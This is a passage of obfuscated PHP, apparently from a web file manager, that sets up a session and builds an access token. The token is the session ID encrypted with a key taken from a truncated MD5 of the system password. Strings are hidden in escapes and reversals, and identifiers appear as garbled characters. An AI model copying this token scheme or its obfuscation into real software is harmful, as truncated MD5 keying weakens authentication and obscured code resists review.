show_tips("\x61\x63\x63\x65\x73\x73\x54\x6f\x6b\x65\x6e\x20\x65".strrev('r')._kstr2('ror!')); } session_id($bÎÙ¤ğñŒ‰); session_name(SESSION_ID); } function access_token_get() { $bÎÙ¤ğñŒ‰ = session_id(); $cœğˆ‘â‘¾ = $GLOBALS[_kstr2('config')][strrev('metsySgnittes')]["\x73\x79\x73\x74\x65\x6d\x50\x61\x73"."\163\167\157\162\144"]; $cœğˆ‘â‘¾ = substr(md5(strrev('olpxEdok')."\162\145\162\137" . $cœğˆ‘â‘¾), 0, 15); $E§ØÆ¼¼åù = Mcrypt::encode($bÎÙ¤ğñŒ‰, $cœğˆ‘â‘¾, 3600 * 24); return $E§ØÆ¼¼åù; } function init_config() { init_setting(); init_session(); init_space_size_hook(); }
